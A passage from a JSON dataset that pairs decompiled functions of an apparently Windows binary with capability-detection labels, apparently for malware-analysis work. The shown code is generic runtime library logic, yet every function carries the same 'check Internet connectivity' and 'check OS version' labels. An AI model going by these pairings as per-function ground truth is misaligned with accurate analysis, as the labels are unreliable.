while (uVar14 - 1 < 0x19) {\n                    if ((uVar8 & 0xf8000000) != 0) {\n                        bVar4 = true;\n                    }\n                    puVar7 = puVar7 + 1;\n                    uVar8 = (uVar14 - 0x10) + uVar8 * 10;\n                    uVar14 = *(*puVar7 + 0x549e00);\n                }\n                uVar22 = -uVar8;\n                if (puStack52 == NULL) {\n                    uVar22 = uVar8;\n                }\n                uStack44 = uStack44 + uVar22;\n            }\n            goto code_r0x00425d88;\n        }\n        *param_1 = puVar15;\n        if (bVar23) {\n            return 0;\n        }\n    }\n    iVar12 = 0;\n    for (puVar7 = puVar15 + (-1 - puStack56); 7 < puVar7; puVar7 = puVar7 >> 1) {\n        iVar12 = iVar12 + 1;\n    }\n    iStack40 = fcn.004269b0(iVar12);\n    puStack36 = iStack40 + 0x14;\n    if (puVar3[1] == 0) {\n        iStack32 = 0;\n    }\n    else {\n        iVar12 = 0;\n        do {\n            iStack32 = iVar12 + 1;\n            iVar13 = iVar12 + 2;\n            iVar12 = iStack32;\n        } while (puVar3[iVar13] != 0);\n    }\n    puVar20 = puStack36;\n    if (puStack56 < puVar15) {\n        puStack52 = NULL;\n        iVar12 = 0;\n        do {\n            while( true ) {\n                uVar8 = puStack52;\n                uVar14 = puVar15[-1];\n                puVar7 = puVar15 + -1;\n                puVar10 = puVar20 + 1;\n                if (uVar14 == puVar3[iStack32]) break;\n                if (iVar12 == 0x20) {\n                    puStack52 = NULL;\n                    *puVar20 = uVar8;\n                    uVar14 = puVar15[-1];\n                    iVar12 = 0;\n                    iVar13 = 4;\n                    puVar16 = puVar20 + 2;\n                    puVar20 = puVar10;\n                }\n                else {\n                    iVar13 = iVar12 + 4;\n                    puVar16 = puVar10;\n                }\n                puStack52 = puStack52 | (*(uVar14 + 0x549e00) & 0xf) << (iVar12 & 0x1f);\n                puVar15 = puVar7;\n                iVar12 = iVar13;\n                puVar10 = puVar16;\n                if (puVar7 <= puStack56) goto code_r0x00425cb0;\n            }\n            puVar15 = puVar7 + -iStack32;\n        } while (puStack56 < puVar15);\ncode_r0x00425cb0:\n        uVar8 = 0x1f;\n        if (puStack52 != NULL) {\n            for (; puStack52 >> uVar8 == 0; uVar8 = uVar8 - 1) {\n            }\n        }\n        uVar8 = uVar8 ^ 0x1f;\n    }\n    else {\n        puStack52 = NULL;\n        puVar10 = iStack40 + 0x18;\n        uVar8 = 0x20;\n    }\n    *puVar20 = puStack52;\n    iVar12 = puVar10 - puStack36 >> 2;\n    *(iStack40 + 0x10) = iVar12;\n    iVar12 = iVar12 * 0x20 - uVar8;\n    uVar22 = *param_2;\n    if (uVar22 < iVar12) {\n        iVar12 = iVar12 - uVar22;\n        uVar17 = fcn.004276d0(iStack40, iVar12);\n        if (uVar17 != 0) {\n            iVar13 = iVar12 + -1;\n            uVar17 = 1;\n            if ((puStack36[iVar13 >> 5] & 1 << (iVar13 & 0x1f)) != 0) {\n                if ((iVar13 == 0) || (iVar13 = fcn.004276d0(iStack40, iVar13),  iVar13 == 0)) {\n                    uVar17 = 2;\n                }\n                else {\n                    uVar17 = 3;\n                }\n            }\n        }\n        fcn.00426330(iStack40, iVar12);\n        uStack44 = uStack44 + iVar12;\n    }\n    else {\n        uVar17 = 0;\n        if (iVar12 < uVar22) {\n            iStack40 = fcn.00426f00(iStack40, uVar22 - iVar12);\n            puStack36 = iStack40 + 0x14;\n            uStack44 = uStack44 - (uVar22 - iVar12);\n        }\n    }\n    if (param_2[2] < uStack44) {\ncode_r0x00425f82:\n        fcn.00426a80(iStack40);\ncode_r0x00425f8e:\n        puVar9 = sub.msvcrt.dll__errno();\n        *puVar9 = 0x22;\n        return 0xa3;\n    }\n    uVar8 = param_2[1];\n    if (uStack44 < uVar8) {\n        uStack44 = uVar8 - uStack44;\n        if (uVar22 <= uStack44) {\n            uVar17 = param_2[3];\n            if (uVar17 == 2) {\n                if (param_5 == 0) goto code_r0x004261b2;\n            }\n            else if (uVar17 == 3) {\n                if (param_5 != 0) goto code_r0x004261b2;\n            }\n            else if ((uVar17 == 1) && (uVar22 == uStack44)) {\n                if (1 < uVar22) {\n                    iVar12 = fcn.004276d0(iStack40, uVar22 - 1);\n                    if (iVar12 == 0) goto code_r0x00425d3e;\n                    uVar8 = param_2[1];\n                }\ncode_r0x004261b2:\n                *(iStack40 + 0x10) = 1;\n                *puStack36 = 1;\ncode_r0x00425e04:\n                *param_4 = iStack40;\n                *param_3 = uVar8;\n                puVar9 = sub.msvcrt.dll__errno();\n                *puVar9 = 0x22;\n                return 0x62;\n            }\ncode_r0x00425d3e:\n            fcn.00426a80(iStack40);\ncode_r0x00425d4a:\n            puVar9 = sub.msvcrt.dll__errno();\n            *puVar9 = 0x22;\n            return 0x50;\n        }\n        iVar12 = uStack44 - 1;\n        if (uVar17 == 0) {\n            if (iVar12 != 0) {\n                uVar17 = fcn.004276d0(iStack40, iVar12);\n            }\n        }\n        else {\n            uVar17 = 1;\n        }\n        if ((puStack36[iVar12 >> 5] & 1 << (iVar12 & 0x1f)) != 0) {\n            uVar17 = uVar17 | 2;\n        }\n        uVar22 = uVar22 - uStack44;\n        uVar14 = 2;\n        fcn.00426330(iStack40, uStack44);\n        uStack44 = param_2[1];\n    }\n    else {\n        uVar14 = 1;\n    }\n    if (uVar17 == 0) goto code_r0x00425fde;\n    uVar8 = param_2[3];\n    if (uVar8 == 2) {\n        param_5 = 1 - param_5;\njoined_r0x0042612c:\n        if (param_5 != 0) {\n            iVar12 = *(iStack40 + 0x10);\n            iStack40 = fcn.0041ea30(iStack40);\n            if (uVar14 == 2) {\n                uVar14 = 0x22;\n                if (*param_2 - 1 == uVar22) {\n                    uVar14 = ((*(iStack40 + 0x14 + (uVar22 >> 5) * 4) & 1 << (uVar22 & 0x1f)) == 0) + 0x21;\n                }\n                goto code_r0x00425fde;\n            }\n            if (*(iStack40 + 0x10) == iVar12 || *(iStack40 + 0x10) < iVar12) {\n                if ((uVar22 & 0x1f) != 0) {\n                    puVar20 = iStack40 + 0x10 + iVar12 * 4;\n                    uVar8 = 0x1f;\n                    if (*puVar20 != 0) {\n                        for (; *puVar20 >> uVar8 == 0; uVar8 = uVar8 - 1) {\n                        }\n                    }\n                    if ((uVar8 ^ 0x1f) < 0x20 - (uVar22 & 0x1f)) goto code_r0x00426172;\n                }\n            }\n            else {\ncode_r0x00426172:\n                fcn.00426330(iStack40, 1);\n                uStack44 = uStack44 + 1;\n                if (param_2[2] < uStack44) goto code_r0x00425f82;\n            }\n            uVar14 = 0x21;\n            goto code_r0x00425fde;\n        }\n    }\n    else {\n        if (uVar8 == 3) goto joined_r0x0042612c;\n        if ((uVar8 == 1) && ((uVar17 & 2) != 0)) {\n            param_5 = (uVar17 | *puStack36) & 1;\n            goto joined_r0x0042612c;\n        }\n    }\n    uVar14 = uVar14 | 0x10;\ncode_r0x00425fde:\n    *param_4 = iStack40;\n    *param_3 = uStack44;\n    return uVar14;\ncode_r0x004259b3:\n    puVar15 = puVar15 + 1;\n    if (uVar1 != uVar19) goto code_r0x00425baa;\n    goto code_r0x004259c1;\n}\n",
        "token_count": 4720
    },
    "00427480": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00427480(int32_t param_1, int32_t param_2, int32_t param_3, uint param_4, int32_t param_5)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    \n    iVar4 = (param_3 + 8) / 9;\n    if (iVar4 < 2) {\n        iVar5 = 0;\n    }\n    else {\n        iVar5 = 0;\n        iVar3 = 1;\n        do {\n            iVar1 = iVar3 * 2;\n            iVar5 = iVar5 + 1;\n            iVar2 = iVar3 * -2;\n            iVar3 = iVar1;\n        } while (iVar4 != iVar1 && SBORROW4(iVar4, iVar1) == iVar4 + iVar2 < 0);\n    }\n    iVar4 = fcn.004269b0(iVar5);\n    *(iVar4 + 0x10) = 1;\n    *(iVar4 + 0x14) = param_4;\n    if (param_2 < 10) {\n        pcVar6 = param_1 + 9 + param_5;\n        param_2 = 9;\n    }\n    else {\n        pcVar6 = param_1 + 9;\n        do {\n            pcVar8 = pcVar6 + 1;\n            iVar4 = fcn.00426af0(iVar4, 10, *pcVar6 + -0x30);\n            pcVar6 = pcVar8;\n        } while (pcVar8 != param_2 + param_1);\n        pcVar6 = param_5 + param_2 + param_1;\n    }\n    if (param_2 < param_3) {\n        pcVar8 = pcVar6;\n        do {\n            pcVar7 = pcVar8 + 1;\n            iVar4 = fcn.00426af0(iVar4, 10, *pcVar8 + -0x30);\n            pcVar8 = pcVar7;\n        } while (pcVar6 + (param_3 - param_2) != pcVar7);\n    }\n    return;\n}\n",
        "token_count": 508
    },
    "00427760": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.00427760(char *param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    char *pcVar2;\n    \n    if ((param_2 != 0) && (pcVar2 = param_1,  *param_1 != '\\0')) {\n        do {\n            pcVar2 = pcVar2 + 1;\n            uVar1 = pcVar2 - param_1;\n            if (param_2 <= uVar1) {\n                return uVar1;\n            }\n        } while (*pcVar2 != '\\0');\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 143
    },
    "004277a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.004277a0(int16_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (param_2 == 0) {\n        return;\n    }\n    if (*param_1 != 0) {\n        while (iVar1 = iVar1 + 1,  param_2 != iVar1) {\n            if (param_1[iVar1] == 0) {\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 115
    },
    "00428850": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint8_t ** __fastcall fcn.00428850(uint param_1, uint param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t in_AL;\n    uint8_t uVar2;\n    char cVar3;\n    uint8_t **ppuVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    uint *puVar9;\n    int32_t *piVar10;\n    uint uVar11;\n    uint8_t uVar12;\n    uint8_t uVar13;\n    uint8_t **extraout_ECX;\n    int32_t *piVar14;\n    uint8_t **ppuVar15;\n    int32_t *piVar16;\n    int32_t *extraout_EDX;\n    uint8_t **ppuVar17;\n    int32_t **ppiVar18;\n    code *pcVar19;\n    int32_t *unaff_EDI;\n    ulong uVar20;\n    int32_t in_stack_ffffffc4;\n    uint8_t **ppuStack52;\n    uint32_t in_stack_ffffffe8;\n    int32_t iStack20;\n    \n    if (in_AL == 0xff) {\n        return NULL;\n    }\n    uVar2 = in_AL & 0x70;\n    if (uVar2 == 0x20) {\n        ppuVar4 = fcn.0041b050(param_2);\n        return ppuVar4;\n    }\n    if (uVar2 < 0x21) {\n        if (((in_AL & 0x70) == 0) || (uVar2 == 0x10)) {\n            return NULL;\n        }\n    }\n    else {\n        if (uVar2 == 0x40) {\n            ppuVar4 = fcn.0041b000(param_2);\n            return ppuVar4;\n        }\n        if (uVar2 == 0x50) {\n            return NULL;\n        }\n        if (uVar2 == 0x30) {\n            ppuVar4 = fcn.0041b040(param_2);\n            return ppuVar4;\n        }\n    }\n    ppuVar4 = sub.msvcrt.dll_abort();\n    if (in_stack_ffffffe8 < 2) {\n        LOCK();\n        piVar10 = iStack20 + -0x40;\n        *piVar10 = *piVar10 + -1;\n        if (*piVar10 != 0) {\n            return ppuVar4;\n        }\n        if (*(iStack20 + -0x2c) != NULL) {\n            in_stack_ffffffc4 = 0x4288d4;\n            (**(iStack20 + -0x2c))();\n        }\n        uVar7 = iStack20 - 0x40;\n        if ((uVar7 <= *0x4f5ce4) || (*0x4f5ce4 + *0x4f5ce8 <= uVar7)) {\n    // WARNING: Could not recover jumptable at 0x00427908. Too many branches\n    // WARNING: Treating indirect jump as call\n            ppuVar4 = (*_sym.imp.msvcrt.dll_free)(uVar7);\n            return ppuVar4;\n        }\n        if ((*0x4f59f4 == NULL) || (iVar5 = fcn.00418d60(0x4f5cd8),  iVar5 == 0)) {\n            unaff_EDI = iStack20 + -0x50;\n            if (*0x4f5ce0 == NULL) goto code_r0x00428db0;\n            in_stack_ffffffc4 = *(iStack20 + -0x50);\n            piVar10 = unaff_EDI + in_stack_ffffffc4;\n            if (piVar10 < *0x4f5ce0) goto code_r0x00428db0;\n            piVar6 = (*0x4f5ce0)[1];\n            if (*0x4f5ce0 == piVar10) {\n                iVar5 = **0x4f5ce0;\n                *(iStack20 + -0x4c) = piVar6;\n                *(iStack20 + -0x50) = in_stack_ffffffc4 + iVar5;\n                ppuVar4 = *0x4f59f4;\n                *0x4f5ce0 = unaff_EDI;\n                goto joined_r0x00428d90;\n            }\n            piVar14 = *0x4f5ce0;\n            if (piVar6 == NULL) {\n                piVar6 = NULL;\n                ppiVar18 = 0x4f5ce0;\n            }\n            else {\n                piVar16 = *0x4f5ce0;\n                if (piVar10 < piVar6) {\n                    do {\n                        piVar14 = piVar6;\n                        piVar6 = piVar14[1];\n                        ppiVar18 = piVar16 + 1;\n                        if (piVar6 == NULL) break;\n                        piVar16 = piVar14;\n                    } while (piVar10 < piVar6);\n                }\n                else {\n                    ppiVar18 = 0x4f5ce0;\n                }\n            }\n            if (piVar6 == piVar10) {\n                in_stack_ffffffc4 = in_stack_ffffffc4 + *piVar6;\n                piVar14[1] = piVar6[1];\n            }\n            piVar10 = *ppiVar18;\n            uVar20 = CONCAT44(*piVar10, piVar10);\n            if (unaff_EDI != piVar10 + *piVar10) {\n                *(iStack20 + -0x4c) = piVar10[1];\n                piVar10 = *ppiVar18;\n                *(iStack20 + -0x50) = in_stack_ffffffc4;\n                piVar10[1] = unaff_EDI;\n                ppuVar4 = *0x4f59f4;\n                goto joined_r0x00428d90;\n            }\n        }\n        else {\n            uVar20 = fcn.0042a720();\n        }\n        *uVar20 = (uVar20 >> 0x20) + in_stack_ffffffc4;\n        ppuVar4 = *0x4f59f4;\njoined_r0x00428d90:\n        while ((*0x4f59f4 = ppuVar4,  ppuVar4 != NULL && (ppuVar4 = fcn.00418dc0(0x4f5cd8),  ppuVar4 != NULL))) {\n            fcn.0042a750();\n            *0x4f5ce0 = extraout_EDX;\ncode_r0x00428db0:\n            *(iStack20 + -0x4c) = *0x4f5ce0;\n            ppuVar4 = *0x4f59f4;\n            *0x4f5ce0 = unaff_EDI;\n        }\n        return ppuVar4;\n    }\n    uVar20 = fcn.00428a40(*(iStack20 + -0x24));\n    uVar2 = uVar20;\n    if (uVar2 == 0x50) {\n        ppuVar4 = extraout_ECX + 3 & 0xfffffffc;\n        *ppuStack52 = *ppuVar4;\n        return ppuVar4 + 1;\n    }\n    switch(uVar20 & 0xf) {\n    case 0:\n    case 3:\n    case 0xb:\n        ppuVar17 = *extraout_ECX;\n        ppuVar4 = extraout_ECX + 1;\n        break;\n    case 1:\n        ppuVar17 = NULL;\n        uVar13 = 0;\n        ppuVar15 = extraout_ECX;\n        do {\n            ppuVar4 = ppuVar15 + 1;\n            uVar12 = *ppuVar15;\n            uVar1 = uVar13 & 0x1f;\n            uVar13 = uVar13 + 7;\n            ppuVar17 = ppuVar17 | (uVar12 & 0x7f) << uVar1;\n            ppuVar15 = ppuVar4;\n        } while (uVar12 < '\\0');\n        break;\n    case 2:\n        ppuVar17 = *extraout_ECX;\n        ppuVar4 = extraout_ECX + 2;\n        break;\n    case 4:\n    case 0xc:\n        ppuVar17 = *extraout_ECX;\n        ppuVar4 = extraout_ECX + 2;\n        break;\n    default:\n        uVar8 = sub.msvcrt.dll_abort();\n        fcn.004a36d0(uVar8);\n        uVar8 = fcn.004a0230();\n        fcn.004a36d0(uVar8);\n        fcn.004a3970();\n        while( true ) {\n            fcn.00428700();\n            cVar3 = fcn.004287e0(extraout_ECX);\n            if (cVar3 != '\\0') break;\n            cVar3 = fcn.004287e0(extraout_ECX);\n            if (cVar3 != '\\0') goto code_r0x004a4f72;\n            fcn.00428a40();\n        }\n        fcn.004a3b60();\ncode_r0x004a4f72:\n        puVar9 = fcn.004a3610(4);\n        *puVar9 = 0x50a974;\n        fcn.004a3bc0(puVar9, 0x5071f8, 0x476a20);\n        uVar8 = sub.msvcrt.dll_abort();\n        fcn.004a36d0(uVar8);\n        uVar20 = sub.msvcrt.dll_abort();\n        fcn.004a3840();\n        pcVar19 = (uVar20 >> 0x20) + 1;\n        if (pcVar19 != NULL) {\n            fcn.0041b360(uVar20);\n        }\n        uVar20 = fcn.004a37a0();\n        if (uVar20 >> 0x20 != 1) goto code_r0x004a5051;\n        piVar10 = fcn.004a36d0(uVar20);\n        uVar8 = (**(*piVar10 + 8))();\n        uVar11 = (*pcVar19)(2);\n        sub.msvcrt.dll_fwrite(\"  what():  \", 1, 0xb, uVar11);\n        uVar11 = (*pcVar19)(2);\n        sub.msvcrt.dll_fputs(uVar8, uVar11);\n        uVar8 = (*pcVar19)(2);\n        sub.msvcrt.dll_fputc(10, uVar8);\n        fcn.004a3840();\n        do {\n            sub.msvcrt.dll_abort();\n            fcn.00427908();\n            fcn.004a3b60();\ncode_r0x004a5051:\n            fcn.004a36d0();\n            fcn.004a3840();\n        } while( true );\n    case 9:\n        ppuVar17 = NULL;\n        uVar7 = 0;\n        ppuVar15 = extraout_ECX;\n        do {\n            ppuVar4 = ppuVar15 + 1;\n            uVar13 = *ppuVar15;\n            uVar12 = uVar7;\n            uVar7 = uVar7 + 7;\n            ppuVar17 = ppuVar17 | (uVar13 & 0x7f) << (uVar12 & 0x1f);\n            ppuVar15 = ppuVar4;\n        } while (uVar13 < '\\0');\n        if ((0x1f < uVar7) || ((uVar13 & 0x40) == 0)) break;\n        ppuVar17 = ppuVar17 | -1 << (uVar7 & 0x1f);\n        goto code_r0x00428939;\n    case 10:\n        ppuVar17 = *extraout_ECX;\n        ppuVar4 = extraout_ECX + 2;\n    }\n    if (ppuVar17 != NULL) {\ncode_r0x00428939:\n        ppuVar15 = extraout_ECX;\n        if ((uVar2 & 0x70) != 0x10) {\n            ppuVar15 = uVar20 >> 0x20;\n        }\n        ppuVar17 = ppuVar17 + ppuVar15;\n        if (uVar2 < '\\0') {\n            *ppuStack52 = *ppuVar17;\n            return ppuVar4;\n        }\n    }\n    *ppuStack52 = ppuVar17;\n    return ppuVar4;\n}\n",
        "token_count": 2845
    },
    "0042a530": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid __cdecl fcn.0042a530(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint *puVar3;\n    char *pcVar4;\n    uint uVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    char *pcVar10;\n    char **ppcVar11;\n    char **ppcVar12;\n    char **ppcVar13;\n    char **ppcVar14;\n    ulong uVar15;\n    char *apcStack220 [4];\n    int32_t aiStack204 [4];\n    int32_t aiStack188 [10];\n    uchar uStack145;\n    int32_t var_8ch;\n    uchar var_81h;\n    uint var_80h;\n    uint var_1ch;\n    \n    _var_81h = str.not_enough_space_for_format_expansion__Please_submit_full_bug_report_at_https:__gcc.gnu.org_bugs__:_n____\n               ._0_4_;\n    var_1ch = str.not_enough_space_for_format_expansion__Please_submit_full_bug_report_at_https:__gcc.gnu.org_bugs__:_n____\n              ._101_4_;\n    puVar6 = 0x502dc5;\n    puVar3 = &fcn.0042a530::var_80h;\n    for (iVar7 = 0x1a; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar3 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    aiStack188[3] = 0x42a572;\n    uVar15 = fcn.00418950();\n    var_8ch = uVar15 >> 0x20;\n    iVar7 = -uVar15;\n    puVar9 = &stack0xffffff6f + iVar7 & 0xfffffff0;\n    puVar6 = &stack0xffffff7b;\n    puVar3 = puVar9;\n    for (iVar8 = 0x1a; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar3 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *(&stack0xffffff5c + iVar7) = var_8ch;\n    *(&stack0xffffff54 + iVar7) = puVar9 + 0x1a;\n    *(&stack0xffffff58 + iVar7) = arg_8h;\n    *(&stack0xffffff50 + iVar7) = 0x42a5a6;\n    sub.msvcrt.dll_memcpy();\n    *(puVar9 + var_8ch + 0x68) = 0;\n    *(&stack0xffffff54 + iVar7) = puVar9;\n    *(&stack0xffffff50 + iVar7) = 0x42a5b9;\n    fcn.0049eb30(*(&stack0xffffff54 + iVar7));\n    *(&stack0xffffff50 + iVar7) = puVar3;\n    *(&stack0xffffff4c + iVar7) = puVar6;\n    *(&stack0xffffff48 + iVar7) = puVar9;\n    if (*0x4f74bc != '\\0') {\n        *(&stack0xffffff28 + iVar7) = 2;\n        ppcVar14 = &stack0xffffff24 + iVar7;\n        *(&stack0xffffff24 + iVar7) = 0x42a6f3;\n        pcVar10 = (**0x4f5a60)();\n        ppcVar14[2] = 0x1d;\n        ppcVar14[3] = pcVar10;\n        ppcVar14[1] = 0x1;\n        *ppcVar14 = \"terminate called recursively\\n\";\n        ppcVar14[-1] = 0x42a713;\n        sub.msvcrt.dll_fwrite();\n        ppcVar14[-1] = 0x42a718;\n        sub.msvcrt.dll_abort();\n        ppcVar14[-7] = 0x4;\n        ppcVar14[-8] = 0x42a72f;\n        puVar6 = fcn.004a3610();\n        *puVar6 = 0x509dc8;\n        ppcVar14[-5] = 0x42a4f0;\n        ppcVar14[-6] = 0x506a48;\n        ppcVar14[-7] = puVar6;\n        ppcVar14[-8] = 0x42a74d;\n        fcn.004a3bc0();\n        ppcVar14[-0xe] = 0x4;\n        ppcVar14[-0xf] = 0x42a75f;\n        puVar6 = fcn.004a3610();\n        *puVar6 = 0x509ddc;\n        ppcVar14[-0xc] = 0x42a520;\n        ppcVar14[-0xd] = 0x506a54;\n        ppcVar14[-0xe] = puVar6;\n        ppcVar14[-0xf] = 0x42a77d;\n        fcn.004a3bc0();\n        if (*0x4f5ce4 == 0) {\n            return;\n        }\n        ppcVar14[-0x15] = *0x4f5ce4;\n        ppcVar14[-0x16] = 0x42a794;\n        fcn.00427908();\n        *0x4f5ce4 = 0;\n        return;\n    }\n    *0x4f74bc = 1;\n    *(&stack0xffffff24 + iVar7) = 0x42a5df;\n    iVar8 = fcn.004a37e0();\n    if (iVar8 == 0) {\n        *(&stack0xffffff28 + iVar7) = 2;\n        ppcVar13 = &stack0xffffff24 + iVar7;\n        *(&stack0xffffff24 + iVar7) = 0x42a6c1;\n        pcVar10 = (**0x4f5a60)();\n        ppcVar13[2] = 0x2d;\n        ppcVar13[3] = pcVar10;\n        ppcVar13[1] = 0x1;\n        *ppcVar13 = \"terminate called without an active exception\\n\";\n        ppcVar13[-1] = 0x42a6e1;\n        sub.msvcrt.dll_fwrite();\n        do {\n            *(ppcVar13 + -4) = 0x4a5044;\n            sub.msvcrt.dll_abort();\ncode_r0x004a5044:\n            *ppcVar13 = puVar3;\n            ppcVar13[-1] = 0x4a504c;\n            fcn.00427908();\ncode_r0x004a504c:\n            *(ppcVar13 + -4) = 0x4a5051;\n            fcn.004a3b60();\n            *(ppcVar13 + -4) = 0x4a5056;\n            fcn.004a36d0();\n            *(ppcVar13 + -4) = 0x4a505b;\n            fcn.004a3840();\n        } while( true );\n    }\n    pcVar10 = *(iVar8 + 4);\n    cVar1 = *pcVar10;\n    *(&stack0xffffff30 + iVar7) = 0;\n    *(&stack0xffffff2c + iVar7) = 0;\n    pcVar10 = pcVar10 + (cVar1 == '*');\n    *(&stack0xffffff44 + iVar7) = 0xffffffff;\n    *(&stack0xffffff34 + iVar7) = &stack0xffffff44 + iVar7;\n    *(&stack0xffffff28 + iVar7) = pcVar10;\n    *(&stack0xffffff24 + iVar7) = 0x42a61c;\n    puVar3 = fcn.00417860();\n    pcVar2 = *0x4f5a60;\n    *(&stack0xffffff28 + iVar7) = 2;\n    ppcVar11 = &stack0xffffff24 + iVar7;\n    *(&stack0xffffff24 + iVar7) = 0x42a62d;\n    pcVar4 = (**0x4f5a60)();\n    ppcVar11[2] = 0x30;\n    ppcVar11[3] = pcVar4;\n    ppcVar11[1] = 0x1;\n    *ppcVar11 = \"terminate called after throwing an instance of \\'\";\n    ppcVar11[-1] = 0x42a64d;\n    sub.msvcrt.dll_fwrite();\n    *ppcVar11 = 0x2;\n    if (ppcVar11[7] == NULL) {\n        ppcVar12 = ppcVar11 + -1;\n        ppcVar11[-1] = 0x42a6a6;\n        uVar5 = (*pcVar2)();\n        *ppcVar12 = puVar3;\n        ppcVar12[1] = uVar5;\n        ppcVar12[-1] = 0x42a6b2;\n        sub.msvcrt.dll_fputs();\n    }\n    else {\n        ppcVar12 = ppcVar11 + -1;\n        ppcVar11[-1] = 0x42a65e;\n        pcVar4 = (*pcVar2)();\n        *ppcVar12 = pcVar10;\n        ppcVar12[1] = pcVar4;\n        ppcVar12[-1] = 0x42a66a;\n        sub.msvcrt.dll_fputs();\n    }\n    *ppcVar12 = 0x2;\n    ppcVar13 = ppcVar12 + -1;\n    ppcVar12[-1] = 0x42a673;\n    uVar5 = (*pcVar2)();\n    ppcVar13[2] = 0x2;\n    ppcVar13[3] = uVar5;\n    ppcVar13[1] = 0x1;\n    *ppcVar13 = 0x501f49;\n    ppcVar13[-1] = 0x42a693;\n    sub.msvcrt.dll_fwrite();\n    if (ppcVar13[7] != NULL) goto code_r0x004a504c;\n    goto code_r0x004a5044;\n}\n",
        "token_count": 2369
    },
    "0042b520": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __cdecl fcn.0042b520(uint noname_0, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    uint var_bp_ch;\n    \n    *in_ECX = in_ECX + 2;\n    in_ECX[1] = 0;\n    *(in_ECX + 2) = 0;\n    if (arg_ch != 1) {\n        fcn.004906f0(0, 0, 0x5052d8, 0xd);\n        return;\n    }\n    fcn.004906f0(0, 0, \"iostream error\", 0xe);\n    return;\n}\n",
        "token_count": 159
    },
    "0042bb20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.0042bb20(int32_t *param_1, ushort *param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    ushort *puVar1;\n    uint32_t *extraout_ECX;\n    uint32_t uVar2;\n    \n    uVar2 = *(*param_1 + -0xc);\n    if (uVar2 < param_4) {\n        fcn.0049f220(0x5023e4, 0x502460);\n        return *extraout_ECX;\n    }\n    uVar2 = uVar2 - param_4;\n    if (param_3 < uVar2) {\n        uVar2 = param_3;\n    }\n    if (uVar2 != 0) {\n        puVar1 = *param_1 + param_4 * 2;\n        if (uVar2 == 1) {\n            *param_2 = *puVar1;\n            return 1;\n        }\n        sub.msvcrt.dll_memcpy(param_2, puVar1, uVar2 * 2);\n    }\n    return uVar2;\n}\n",
        "token_count": 251
    },
    "0042ca00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.0042ca00(int32_t *param_1, uchar *param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uchar *puVar1;\n    uint32_t *extraout_ECX;\n    uint32_t uVar2;\n    \n    uVar2 = *(*param_1 + -0xc);\n    if (uVar2 < param_4) {\n        fcn.0049f220(0x5021d4, 0x502250);\n        return *extraout_ECX;\n    }\n    uVar2 = uVar2 - param_4;\n    if (param_3 < uVar2) {\n        uVar2 = param_3;\n    }\n    if (uVar2 != 0) {\n        puVar1 = param_4 + *param_1;\n        if (uVar2 == 1) {\n            *param_2 = *puVar1;\n            return 1;\n        }\n        sub.msvcrt.dll_memcpy(param_2, puVar1, uVar2);\n    }\n    return uVar2;\n}\n",
        "token_count": 245
    },
    "00431e70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
